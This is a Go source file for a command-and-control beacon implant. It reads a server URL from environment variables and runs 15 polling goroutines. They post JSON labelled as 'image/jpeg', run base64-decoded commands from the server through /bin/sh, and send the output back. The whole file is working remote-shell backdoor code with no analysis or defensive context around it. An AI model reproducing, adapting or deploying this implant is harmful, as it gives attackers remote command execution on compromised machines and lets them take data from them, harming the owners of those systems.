package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"sync"
	"time"

	"net/http"
)

type BeaconRequest struct {
	Id       int64  `json:"id"`
	Ipv4     string `json:"ipv4"`
	BId      int64  `json:"bId"`
	TId      int64  `json:"tId"`
	Token    string `json:"token"`
	Response string `json:"response"`
}
type BeaconResponse struct {
	Id    int64  `json:"id"`
	TId   int64  `json:"tId"`
	Token string `json:"token"`
	Ping  int64  `json:"ping"`
	Cmd   string `json:"cmd"`
}

func BeaconGetCommand(i int64, ipv4, url string) {
	var k int64 = 0
	var ping int64 = int64(rand.Intn(11))
	var execResponse []byte
	for {
		fmt.Printf("ping ) %v", ping)
		time.Sleep(time.Duration(ping) * time.Second)
		bResp := BeaconResponse{}
		bReq := BeaconRequest{}
		bReq.Id = k
		bReq.Ipv4 = ipv4
		bReq.BId = 1
		bReq.Response = base64.StdEncoding.EncodeToString(execResponse)
		bReq.Token = "mytoken"
		bReq.TId = i
		j, _ := json.Marshal(&bReq)
		fmt.Printf("\nj=%v\n", string(j))

		jresp, err := http.Post(url, "image/jpeg", bytes.NewBuffer(j))

		if err != nil {
			fmt.Printf("couldnt get response from server")
		} else {

			err = json.NewDecoder(jresp.Body).Decode(&bResp)
			if err == nil {
				fmt.Printf("\nbresp=%v\n", bResp)

				cmd, _ := base64.StdEncoding.DecodeString(bResp.Cmd)
				fmt.Printf("\ncmd=%v\n", string(cmd))
				execResponse, err = exec.Command("/bin/sh", "-c", string(cmd)).Output()
				fmt.Printf("execresp=%v\n", string(execResponse))
				k = bResp.Id
				ping = bResp.Ping
				fmt.Printf("\nPing = %#v\n", ping)

			} else {
				bReq.Response = ""
			}
		}
	}
}
func main() {
	time.Sleep(30)
	ipv4 := os.Getenv("C2Ipv4")
	url := os.Getenv("C2Url")
	signalCh := make(chan bool, 1)
	for i := 0; i < 15; i++ {

		go func(i int64) {
			for {
				select {
				case <-signalCh:
					return
				default:
					BeaconGetCommand(i, ipv4, url)
				}
			}
		}(int64(i))
	}
	var end_waiter sync.WaitGroup
	end_waiter.Add(1)
	var signal_channel chan os.Signal
	signal_channel = make(chan os.Signal, 1)
	signal.Notify(signal_channel, os.Interrupt)
	go func() {
		<-signal_channel
		end_waiter.Done()
	}()
	end_waiter.Wait()
	signalCh <- true
}
